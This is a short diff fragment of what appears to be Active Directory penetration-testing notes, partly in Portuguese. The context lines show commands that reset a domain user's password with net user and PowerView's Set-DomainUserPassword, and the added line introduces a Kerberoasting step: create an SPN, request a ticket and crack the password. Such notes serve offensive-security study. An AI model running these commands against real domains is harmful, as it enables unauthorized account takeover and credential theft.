@@ -1032,3 +1032,4 @@ net user chichi Password123! /domain
 $UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
 Set-DomainUserPassword -Identity chichi -AccountPassword $UserPassword
 ```
+CRIAR SPN , SOLICITAR TICKET E QUEBRAR A SENHA (KERBEROASTING)
